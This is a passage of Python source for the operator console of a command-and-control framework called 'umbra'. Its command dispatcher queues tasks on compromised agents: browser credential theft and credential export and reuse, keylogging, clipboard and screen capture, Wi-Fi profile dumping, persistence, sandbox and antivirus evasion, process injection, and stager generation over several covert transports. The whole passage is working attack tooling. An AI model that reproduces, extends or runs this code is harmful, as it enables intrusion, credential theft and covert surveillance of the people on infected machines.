                routes = client.vpn_routes()
                emit(routes) if args.json else print_vpn_routes(routes)
            elif args.action == "route":
                if not args.target or not args.network:
                    print("usage: umbra vpn route <peer> <network>", file=sys.stderr)
                    return 2
                data = client.vpn_route(args.target, args.network)
                if args.json:
                    emit(data)
                else:
                    print(f"{data.get('network')} -> {data.get('peer')}")
            elif args.action == "ping":
                if not args.target:
                    print("usage: umbra vpn ping <peer>", file=sys.stderr)
                    return 2
                data = client.vpn_ping(args.target)
                emit(data) if args.json else print(
                    f"{args.target} answered in {data.get('rtt_text', '?')}")
            else:
                if not args.target:
                    print("usage: umbra vpn allocate <agent>", file=sys.stderr)
                    return 2
                address = client.vpn_allocate(args.target)
                if args.json:
                    emit({"id": args.target, "address": address})
                else:
                    print(f"{args.target} -> {address}")
        elif args.cmd == "armory":
            if args.action == "list":
                data = client.armory_list()
                if args.json:
                    emit(data)
                else:
                    print_armory(data)
            elif args.action == "search":
                data = client.armory_search(args.name or "")
                if args.json:
                    emit(data)
                else:
                    print_armory({"entries": data.get("entries", []),
                                  "installed": [], "verified": True})
            elif args.action == "needs":
                if not args.name:
                    print("usage: umbra armory needs <name>", file=sys.stderr)
                    return 2
                data = client.armory_needs(args.name)
                if args.json:
                    emit(data)
                else:
                    print_armory_needs(data)
            elif args.action == "versions":
                if not args.name:
                    print("usage: umbra armory versions <name>", file=sys.stderr)
                    return 2
                data = client.armory_versions(args.name)
                if args.json:
                    emit(data)
                else:
                    versions = ", ".join(data.get("versions") or []) or "no versions"
                    print(f"{data.get('name')}: {versions}")
            elif args.action == "resolve":
                if not args.name:
                    print("usage: umbra armory resolve <name>", file=sys.stderr)
                    return 2
                data = client.armory_resolve(args.name)
                if args.json:
                    emit(data)
                else:
                    print(f"install order: {' -> '.join(data.get('order') or [])}")
            elif args.action == "import":
                if not args.url:
                    print("usage: umbra armory import <url>", file=sys.stderr)
                    return 2
                data = client.armory_import(args.url)
                if args.json:
                    emit(data)
                else:
                    print(f"imported {data.get('entries')} entries from {args.url}")
            elif args.action == "install":
                if not args.name:
                    print("usage: umbra armory install <name>", file=sys.stderr)
                    return 2
                data = client.armory_install(args.name)
                if args.json:
                    emit(data)
                else:
                    print(f"installed {data.get('name')} ({data.get('size')} bytes)")
            elif args.action == "remove":
                if not args.name:
                    print("usage: umbra armory remove <name>", file=sys.stderr)
                    return 2
                client.armory_remove(args.name)
                if args.json:
                    emit({"name": args.name, "removed": True})
                else:
                    print(f"removed {args.name}")
            else:
                if not args.name or not args.agent:
                    print("usage: umbra armory run <name> <agent> [--args JSON]", file=sys.stderr)
                    return 2
                try:
                    task_args = json.loads(args.args)
                except json.JSONDecodeError as exc:
                    print(f"invalid --args json: {exc}", file=sys.stderr)
                    return 2
                task_id = client.armory_run(args.name, args.agent, task_args)
                console.note_task(task_id, args.agent, f"armory:{args.name}", task_args)
                if args.json:
                    emit({"task_id": task_id, "name": args.name, "agent": args.agent})
                else:
                    print(f"queued {task_id} ({args.name} on {args.agent})")
        elif args.cmd == "alias":
            if args.action == "list":
                aliases = client.alias_list()
                if args.json:
                    emit(aliases)
                else:
                    print_aliases(aliases)
            elif args.action == "add":
                if not args.name:
                    print("usage: umbra alias add <name> --kind <kind>", file=sys.stderr)
                    return 2
                try:
                    task_args = json.loads(args.args)
                except json.JSONDecodeError as exc:
                    print(f"invalid --args json: {exc}", file=sys.stderr)
                    return 2
                spec = [s.strip() for s in (args.spec or "").split(",") if s.strip()]
                data = client.alias_add(args.name, kind=args.kind, args=task_args,
                                        description=args.description, args_spec=spec,
                                        extension=args.extension)
                if args.json:
                    emit(data)
                else:
                    print(f"alias {args.name} written by {data.get('by', '?')}")
            elif args.action == "rm":
                if not args.name:
                    print("usage: umbra alias rm <name>", file=sys.stderr)
                    return 2
                data = client.alias_remove(args.name)
                if args.json:
                    emit(data)
                else:
                    print(f"alias {args.name} removed")
            else:
                if not args.name or not args.agent:
                    print("usage: umbra alias run <name> <agent> [--args JSON]", file=sys.stderr)
                    return 2
                try:
                    task_args = json.loads(args.args)
                except json.JSONDecodeError as exc:
                    print(f"invalid --args json: {exc}", file=sys.stderr)
                    return 2
                task_id = client.alias_run(args.name, args.agent, task_args)
                console.note_task(task_id, args.agent, f"alias:{args.name}", task_args)
                if args.json:
                    emit({"task_id": task_id, "name": args.name, "agent": args.agent})
                else:
                    print(f"queued {task_id} ({args.name} on {args.agent})")
        elif args.cmd == "session":
            opened = client.open_session(args.agent, args.shell_cmd)
            task_id = str(opened.get("task_id", ""))
            console.note_task(task_id, args.agent, "session.open", {"cmd": args.shell_cmd})
            if args.json:
                emit(opened)
            else:
                print(f"session task {task_id} queued")
            if args.input_text:
                session_id = wait_for_session_id(client, task_id, args.timeout)
                if session_id:
                    client.session_input(args.agent, session_id,
                                         (args.input_text + "\n").encode())
                result = client.wait_for_result(task_id, timeout=args.timeout)
                console.note_result(task_id, result)
                emit(result) if args.json else print_task_result(result)
            elif not args.json:
                stream_session(client, console, args.agent, task_id, args.timeout)
        elif args.cmd == "chain":
            try:
                stages = json.loads(args.stages)
            except json.JSONDecodeError as exc:
                print(f"invalid --stages json: {exc}", file=sys.stderr)
                return 2
            if not isinstance(stages, list) or not stages:
                print("a chain needs at least one stage", file=sys.stderr)
                return 2
            data = client.submit_chain(args.agent, stages)
            task_id = str(data.get("task_id", ""))
            console.note_task(task_id, args.agent, "chain", {"stages": stages})
            if args.json:
                emit(data)
            else:
                print(f"chain {data.get('chain_id', '?')} queued ({len(stages)} stages)")
            if args.wait and task_id:
                result = client.wait_for_result(task_id, timeout=args.timeout)
                console.note_result(task_id, result)
                emit(result) if args.json else print_task_result(result)
        elif args.cmd == "alerts":
            rows = client.alerts()
            emit(rows) if args.json else print_alerts(rows)
        elif args.cmd == "screenshot":
            task_id = client.submit(args.agent, "screenshot", {})
            console.note_task(task_id, args.agent, "screenshot", {})
            result = client.wait_for_result(task_id, timeout=args.timeout)
            console.note_result(task_id, result)
            raw = result.get("out", b"")
            if isinstance(raw, str):
                raw = raw.encode()
            if not raw:
                print("the agent returned no image", file=sys.stderr)
                return 1
            try:
                png = image.bmp_to_png(bytes(raw))
            except ValueError as exc:
                print(f"the image could not be converted: {exc}", file=sys.stderr)
                return 1
            target = args.file or f"screenshot-{args.agent}.png"
            with open(target, "wb") as handle:
                handle.write(png)
            if args.json:
                emit({"task_id": task_id, "agent": args.agent, "file": target,
                      "bytes": len(png)})
            else:
                print(f"{target} ({len(png)} bytes)")
        elif args.cmd == "clipboard":
            run_task_and_wait(client, console, args.agent, "clipboard", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "windows":
            run_task_and_wait(client, console, args.agent, "window.list", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "clipboard-watch":
            run_task_and_wait(client, console, args.agent, "clipboard.watch",
                              {"action": args.action},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "screen-stream":
            run_task_and_wait(client, console, args.agent, "screen.stream",
                              {"frames": args.frames, "fps": args.fps},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "wifi-profiles":
            run_task_and_wait(client, console, args.agent, "wifi.profiles", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "browser-creds":
            run_task_and_wait(client, console, args.agent, "browser.creds",
                              {"raw": bool(args.raw)},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "av-survey":
            run_task_and_wait(client, console, args.agent, "av.survey", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "usb-history":
            run_task_and_wait(client, console, args.agent, "usb.history", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "memory":
            run_task_and_wait(client, console, args.agent, "proc.memory",
                              {"pid": str(args.pid)},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "persist":
            run_task_and_wait(client, console, args.agent, "persist",
                              {"method": args.method, "name": args.name,
                               "silent": args.silent, "verify": args.verify},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "unpersist":
            run_task_and_wait(client, console, args.agent, "unpersist",
                              {"method": args.method},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "persist-list":
            run_task_and_wait(client, console, args.agent, "persist.list", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "persist-verify":
            run_task_and_wait(client, console, args.agent, "persist.verify", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "persist-migrate":
            run_task_and_wait(client, console, args.agent, "persist.migrate",
                              {"from": args.source, "to": args.target},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "persist-health":
            run_task_and_wait(client, console, args.agent, "persist.health", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "persist-report":
            print_persistence(client.persistence_report(args.agent), args.json)
        elif args.cmd == "creds-list":
            print_credentials(
                client.creds_list(args.agent, args.kind, args.query),
                args.json)
        elif args.cmd == "creds-search":
            print_credentials(
                client.creds_search(args.query, args.kind, args.agent),
                args.json)
        elif args.cmd == "creds-export":
            print_credentials(
                client.creds_export(args.agent, args.kind, args.query),
                args.json, with_secrets=True)
        elif args.cmd == "creds-reuse":
            return run_creds_reuse(client, console, args)
        elif args.cmd == "evade-report":
            if args.agent:
                run_task_and_wait(client, console, args.agent, "evade.report", {},
                                  args.wait, args.timeout, args.json)
            else:
                print_postures(client.posture_report(), args.json)
        elif args.cmd == "evade-posture":
            evade_args: Dict[str, Any] = {}
            if args.silence is not None:
                evade_args["silence_on_sandbox"] = args.silence
            if args.slow is not None:
                evade_args["slow_on_sandbox"] = args.slow
            for name in ("virtual_factor", "sandbox_factor", "lab_factor",
                         "developer_factor", "jitter_bonus"):
                value = getattr(args, name)
                if value:
                    evade_args[name] = value
            run_task_and_wait(client, console, args.agent, "evade.posture", evade_args,
                              args.wait, args.timeout, args.json)
        elif args.cmd == "evade-profile":
            evade_args = {}
            for name in ("base", "busy_start", "busy_end", "busy_factor",
                         "night_factor", "weekend_factor"):
                value = getattr(args, name)
                if value:
                    evade_args[name] = value
            run_task_and_wait(client, console, args.agent, "evade.profile", evade_args,
                              args.wait, args.timeout, args.json)
        elif args.cmd == "evade-shape":
            evade_args = {}
            if args.mode:
                evade_args["mode"] = args.mode
            if args.size:
                evade_args["size"] = args.size
            if args.pad_every:
                evade_args["pad_every"] = args.pad_every
            if args.reorder is not None:
                evade_args["reorder"] = args.reorder
            run_task_and_wait(client, console, args.agent, "evade.shape", evade_args,
                              args.wait, args.timeout, args.json)
        elif args.cmd == "evade-killswitch":
            evade_args = {"clear": args.clear}
            if args.file:
                evade_args["file"] = args.file
            if args.registry:
                evade_args["registry"] = args.registry
            if args.at:
                evade_args["at"] = args.at
            if args.uptime:
                evade_args["uptime"] = args.uptime
            if args.marker:
                evade_args["marker"] = args.marker
            if args.note:
                evade_args["note"] = args.note
            run_task_and_wait(client, console, args.agent, "evade.killswitch", evade_args,
                              args.wait, args.timeout, args.json)
        elif args.cmd == "hygiene":
            evade_args = {}
            if args.copy:
                evade_args["copy"] = args.copy
            if args.name:
                evade_args["name"] = args.name
            if args.cwd:
                evade_args["cwd"] = args.cwd
            if args.clean_env:
                evade_args["clean_env"] = True
            if args.ppid:
                evade_args["ppid"] = args.ppid
            kind = "hygiene.process" if evade_args else "hygiene.memory"
            if args.memory:
                kind = "hygiene.memory"
            run_task_and_wait(client, console, args.agent, kind, evade_args,
                              args.wait, args.timeout, args.json)
        elif args.cmd == "update":
            run_task_and_wait(client, console, args.agent, "update",
                              {"path": args.path, "sha256": args.sha256},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "keylog-file":
            run_task_and_wait(client, console, args.agent, "keylog.file",
                              {"path": args.path, "seconds": args.seconds},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "tail":
            run_task_and_wait(client, console, args.agent, "tail",
                              {"path": args.path, "lines": args.lines},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "hash":
            run_task_and_wait(client, console, args.agent, "hash",
                              {"path": args.path},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "registry":
            run_task_and_wait(client, console, args.agent, "registry",
                              {"hive": args.hive, "key": args.key, "value": args.value},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "proc":
            run_task_and_wait(client, console, args.agent, "ps", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "proc-kill":
            target = args.target.strip()
            task_args: Dict[str, Any] = {}
            if target.isdigit():
                task_args["pid"] = int(target)
            else:
                task_args["name"] = target
            run_task_and_wait(client, console, args.agent, "proc.kill", task_args,
                              args.wait, args.timeout, args.json)
        elif args.cmd == "report":
            if args.all:
                text = build_engagement_report(client, args.limit, console.store)
            elif args.agent:
                text = build_report(client, args.agent, args.limit, console.store)
            else:
                print("usage: umbra report <agent> | umbra report --all",
                      file=sys.stderr)
                return 2
            if args.out:
                with open(args.out, "w", encoding="utf-8") as fh:
                    fh.write(text)
                if args.json:
                    emit({"agent": args.agent, "file": args.out, "bytes": len(text)})
                else:
                    print(f"wrote {args.out} ({len(text)} bytes)")
            else:
                print(text, end="")
        elif args.cmd == "rpc":
            # The raw command line: the escape hatch for everything the
            # console does not have a button for.
            payload: Dict[str, Any] = {}
            if args.args:
                try:
                    loaded = json.loads(args.args)
                except json.JSONDecodeError as exc:
                    print(f"invalid json: {exc}", file=sys.stderr)
                    return 2
                if not isinstance(loaded, dict):
                    print("the arguments must be a json object", file=sys.stderr)
                    return 2
                payload.update(loaded)
            pairs, broken = split_params(args.arg)
            for key, value in pairs.items():
                payload[key] = value
            if broken:
                print("the arguments must be key=value: " + ", ".join(broken),
                      file=sys.stderr)
                return 2
            res = client.rpc(args.command, payload)
            if args.json:
                emit({"ok": res.ok, "data": res.data, "error": res.error})
            elif res.ok:
                print(json.dumps(res.data, indent=2, default=str, sort_keys=True))
            else:
                print(f"error: {res.error}", file=sys.stderr)
                return 1
        elif args.cmd == "batch":
            # The plan: one file, one line, a whole phase of the engagement.
            try:
                plan = load_plan(args.file)
                steps = plan_steps(plan)
            except PlanError as exc:
                print(f"the plan is not usable: {exc}", file=sys.stderr)
                return 2
            params, broken = split_params(args.param)
            if broken:
                print("the parameters must be key=value: " + ", ".join(broken),
                      file=sys.stderr)
                return 2
            missing = [name for name in plan_params(plan)
                       if not str(params.get(name, "")).strip()]
            if missing:
                print("the plan needs: " + ", ".join(missing), file=sys.stderr)
                return 2
            outcome = run_plan(client, console, steps, params,
                               wait=not args.no_wait, timeout=args.timeout)
            if args.json:
                emit(outcome)
            else:
                for entry in outcome["steps"]:
                    mark = "ok " if entry.get("ok") else "!! "
                    detail = entry.get("detail") or entry.get("err") or ""
                    print(f"{mark}{entry.get('index')} {entry.get('kind')} {detail}")
                if outcome.get("report"):
                    print()
                    print(outcome["report"])
        elif args.cmd == "workflow":
            if args.action == "list":
                payload = client.workflow_list()
                if args.json:
                    emit(payload)
                else:
                    print(render_workflows(payload))
            elif args.action == "add":
                if not args.name:
                    print("usage: umbra workflow add <name> --file plan.yaml",
                          file=sys.stderr)
                    return 2
                if not args.file:
                    print("a workflow is written from a plan file", file=sys.stderr)
                    return 2
                try:
                    plan = load_plan(args.file)
                    steps = plan_steps(plan)
                except PlanError as exc:
                    print(f"the plan is not usable: {exc}", file=sys.stderr)
                    return 2
                description = args.description or str(plan.get("description", ""))
                data = client.workflow_add(args.name, steps,
                                           description=description,
                                           params=plan_params(plan))
                if args.json:
                    emit(data)
                else:
                    print(f"workflow {args.name} written")
            elif args.action == "rm":
                if not args.name:
                    print("usage: umbra workflow rm <name>", file=sys.stderr)
                    return 2
                client.workflow_remove(args.name)
                if args.json:
                    emit({"removed": args.name})
                else:
                    print(f"workflow {args.name} removed")
            elif args.action == "status":
                if not args.name:
                    print("usage: umbra workflow status <run-id>", file=sys.stderr)
                    return 2
                payload = client.workflow_status(args.name)
                run = payload.get("run") or {}
                if args.json:
                    emit(payload)
                else:
                    print(f"run {run.get('id', '')} of {run.get('workflow', '')}: "
                          f"{run.get('state', '')}")
                    for step in run.get("steps") or []:
                        mark = "ok " if step.get("ok") else "!! "
                        print(f"  {mark}{step.get('index')} {step.get('kind')} "
                              f"{step.get('detail', '')}")
                    if run.get("report"):
                        print()
                        print(run["report"])
            else:
                if not args.name:
                    print("usage: umbra workflow run <name> [--param key=value]",
                          file=sys.stderr)
                    return 2
                params, broken = split_params(args.param)
                if broken:
                    print("the parameters must be key=value: " + ", ".join(broken),
                          file=sys.stderr)
                    return 2
                data = client.workflow_run(args.name, params)
                run_id = str(data.get("run_id", ""))
                if args.json and not args.wait:
                    emit(data)
                else:
                    print(f"workflow {args.name} started as {run_id}")
                if args.wait and run_id:
                    # The run happens on the server; the console watches it.
                    deadline = time.time() + args.timeout
                    state = ""
                    while time.time() < deadline:
                        payload = client.workflow_status(run_id)
                        run = payload.get("run") or {}
                        state = str(run.get("state", ""))
                        if state in ("done", "failed", "stopped"):
                            break
                        time.sleep(1.0)
                    if args.json:
                        emit(payload)
                    else:
                        print(f"run {run_id}: {state}")
                        for step in (payload.get("run") or {}).get("steps") or []:
                            mark = "ok " if step.get("ok") else "!! "
                            print(f"  {mark}{step.get('index')} {step.get('kind')} "
                                  f"{step.get('detail', '')}")
                        if (payload.get("run") or {}).get("report"):
                            print()
                            print((payload.get("run") or {})["report"])
        elif args.cmd == "browse":
            run_task_and_wait(client, console, args.agent, "find",
                              {"path": args.path, "name": "", "content": "", "max": args.max},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "triage":
            run_task_and_wait(client, console, args.agent, "triage", {"path": args.path},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "find":
            run_task_and_wait(client, console, args.agent, "find",
                              {"path": args.path, "name": args.name,
                               "content": args.content, "max": args.max},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "netinfo":
            run_task_and_wait(client, console, args.agent, "netinfo", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "policy":
            if args.sleep <= 0 and args.jitter <= 0 and args.obfuscate is None:
                print("usage: umbra policy <agent> --sleep N --jitter P "
                      "[--obfuscate|--no-obfuscate]", file=sys.stderr)
                return 2
            if not args.agent and not args.all:
                print("name an agent or pass --all with a filter", file=sys.stderr)
                return 2
            sleep = args.sleep if args.sleep > 0 else 60
            jitter = args.jitter if args.jitter > 0 else 20
            data = client.set_policy(
                sleep, jitter, obfuscate=args.obfuscate,
                agents=[args.agent] if args.agent else None,
                state=args.state, tag=args.tag,
            )
            updated = data.get("updated", [])
            if args.json:
                emit(data)
            else:
                print(f"policy pushed to {len(updated)} agent(s): "
                      f"sleep {sleep}s, jitter {jitter}%"
                      + ("" if args.obfuscate is None
                         else (", obfuscated" if args.obfuscate else ", fixed interval")))
        elif args.cmd == "tag":
            labels = [t.strip() for t in args.labels if t.strip()]
            if not labels:
                print("usage: umbra tag <agent> <label> [--remove|--set]", file=sys.stderr)
                return 2
            mode = "remove" if args.remove else ("set" if args.replace else "add")
            data = client.tag_agents(
                labels, mode=mode,
                agents=[args.agent] if args.agent else None,
                state=args.state, tag=args.match,
            )
            if args.json:
                emit(data)
            else:
                print(f"{mode}: {', '.join(labels)} on {len(data.get('updated', []))} agent(s)")
        elif args.cmd == "team-sync":
            data = client.team_sync()
            if args.json:
                emit(data)
            else:
                print_team(data)
        elif args.cmd == "migrate":
            try:
                task_args = json.loads(args.args)
            except json.JSONDecodeError as exc:
                print(f"invalid --args json: {exc}", file=sys.stderr)
                return 2
            if not isinstance(task_args, dict):
                print("--args must be a JSON object", file=sys.stderr)
                return 2
            task_args["mode"] = "migrate"
            if args.pid:
                task_args["pid"] = args.pid
            if args.spawn:
                task_args["spawn"] = args.spawn
            if args.out:
                task_args["out"] = True
            if args.resume:
                task_args["resume"] = True
            task_id = client.submit(args.agent, "inject", task_args)
            console.note_task(task_id, args.agent, "inject:migrate", task_args)
            if args.json and not args.wait:
                emit({"task_id": task_id, "agent": args.agent, "kind": "inject"})
            else:
                print(f"queued {task_id}")
            if args.wait:
                result = client.wait_for_result(task_id, timeout=args.timeout)
                console.note_result(task_id, result)
                emit(result) if args.json else print_task_result(result)
        elif args.cmd == "recon":
            task_args = {}
            if args.profile:
                task_args["profile"] = args.profile
            checks = [c.strip() for c in (args.checks or "").split(",") if c.strip()]
            if checks:
                task_args["checks"] = checks
            task_id = client.submit(args.agent, "recon", task_args)
            console.note_task(task_id, args.agent, "recon", task_args)
            if args.json and not args.wait:
                emit({"task_id": task_id, "agent": args.agent, "kind": "recon",
                      "args": task_args})
            else:
                print(f"queued {task_id}")
            if args.wait:
                result = client.wait_for_result(task_id, timeout=args.timeout)
                console.note_result(task_id, result)
                emit(result) if args.json else print_task_result(result)
        elif args.cmd == "domain-map":
            task_args = {}
            if args.target:
                task_args["target"] = args.target
            task_id = client.submit(args.agent, "domain.map", task_args)
            console.note_task(task_id, args.agent, "domain.map", task_args)
            if args.json and not args.wait:
                emit({"task_id": task_id, "agent": args.agent, "kind": "domain.map",
                      "args": task_args})
            else:
                print(f"queued {task_id}")
            if args.wait:
                result = client.wait_for_result(task_id, timeout=args.timeout)
                console.note_result(task_id, result)
                emit(result) if args.json else print_task_result(result)
        elif args.cmd == "suggest":
            task_args = {}
            if args.profile:
                task_args["profile"] = args.profile
            task_id = client.submit(args.agent, "recon.suggest", task_args)
            console.note_task(task_id, args.agent, "recon.suggest", task_args)
            if args.json and not args.wait:
                emit({"task_id": task_id, "agent": args.agent, "kind": "recon.suggest",
                      "args": task_args})
            else:
                print(f"queued {task_id}")
            if args.wait:
                result = client.wait_for_result(task_id, timeout=args.timeout)
                console.note_result(task_id, result)
                emit(result) if args.json else print_task_result(result)
        elif args.cmd == "stager":
            payload = b""
            if args.payload:
                try:
                    with open(args.payload, "rb") as handle:
                        payload = handle.read()
                except OSError as exc:
                    print(f"cannot read {args.payload}: {exc}", file=sys.stderr)
                    return 2
            script = client.stager_generate(
                platform=args.platform,
                transport=args.transport,
                server=args.server,
                url=args.url,
                sha256=args.sha256,
                agent_id=args.agent_id,
                mode=args.mode,
                store=args.store,
                store_base=args.store_base,
                dns_domain=args.dns_domain,
                dns_resolver=args.dns_resolver,
                smtp_addr=args.smtp_addr,
                pop3_addr=args.pop3_addr,
                s3_endpoint=args.s3_endpoint,
                s3_region=args.s3_region,
                payload=payload,
            )
            print(script)
        else:  # pragma: no cover - argparse covers this
            print(f"unknown command {args.cmd}", file=sys.stderr)
            return 2
    except OperatorError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    finally:
        client.close()
        if store is not None:
            try:
                store.end_session(console.session)
            except Exception:  # noqa: BLE001
                pass
            store.close()
    return 0


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
